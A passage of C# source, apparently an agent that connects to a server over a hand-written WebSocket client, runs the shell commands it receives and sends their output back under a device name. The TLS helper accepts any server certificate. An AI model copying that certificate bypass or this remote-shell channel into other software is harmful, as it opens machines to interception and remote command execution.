                using (Process proc = new Process())
                {
                    proc.StartInfo = psi;
                    proc.OutputDataReceived += delegate(object s2, DataReceivedEventArgs e2) { if (e2.Data != null) lock (slock) { sb.AppendLine(e2.Data); } };
                    proc.ErrorDataReceived += delegate(object s3, DataReceivedEventArgs e3) { if (e3.Data != null) lock (slock) { sb.AppendLine(e3.Data); } };
                    proc.Start();
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(timeoutSec * 1000))
                    {
                        try { proc.Kill(); } catch { }
                        lock (slock) { sb.AppendLine(); sb.AppendLine(""[TIMEOUT] Killed after "" + timeoutSec + ""s""); }
                        exitCode = -9;
                    }
                    else
                    {
                        exitCode = proc.ExitCode;
                        proc.WaitForExit();
                    }
                }
                lock (slock) { output = sb.ToString(); }
            }
        }
        catch (Exception ex) { output = ""SHELL ERROR: "" + ex.Message; }
        if (output == null) output = """";
        if (output.Length > 200000) output = output.Substring(output.Length - 200000);
        try
        {
            string msg = ""{\""type\"":1,\""target\"":\""ShellCommandResult\"",\""arguments\"":[\""""
                + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(reqId) + ""\"",""
                + exitCode + "",\"""" + EscapeJson(output) + ""\""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
        }
        catch { }
    }

    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else sb.Append(c); } return sb.ToString(); }

    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }

    private static string GetJsonString(string json, string key)
    {
        try
        {
            int i = json.IndexOf(key, StringComparison.Ordinal);
            if (i < 0) return null;
            int col = json.IndexOf(':', i);
            if (col < 0) return null;
            col++;
            while (col < json.Length && (json[col] == ' ' || json[col] == '\t')) col++;
            if (col < json.Length && json[col] == '""')
            {
                int end = json.IndexOf('""', col + 1);
                if (end < 0) return null;
                return json.Substring(col + 1, end - col - 1);
            }
            int r = json.IndexOf(',', col);
            int b = json.IndexOf('}', col);
            int stop = (r < 0) ? b : (b < 0 ? r : Math.Min(r, b));
            if (stop < 0) stop = json.Length;
            return json.Substring(col, stop - col).Trim();
        }
        catch { return null; }
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; }
            else idx++;
        }
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; }
            if (c == '""') break;
            sb.Append(c); idx++;
        }
        return sb.ToString();
    }

    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);
        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);
        if (len <= 125) frame.WriteByte((byte)(0x80 | len));
        else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); }
        else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); }
        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        byte[] frameBytes = frame.ToArray();
        lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        IAsyncResult ar = ssl.BeginAuthenticateAsClient(host, null, null);
        if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
        {
            try { ssl.Close(); } catch { }
            throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
        }
        ssl.EndAuthenticateAsClient(ar);
        return ssl;
    }
}";
    }


    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException("End of stream");
            offset += r;
        }
    }

    private static int IndexOfSeparator(System.Text.StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }
}
#endif

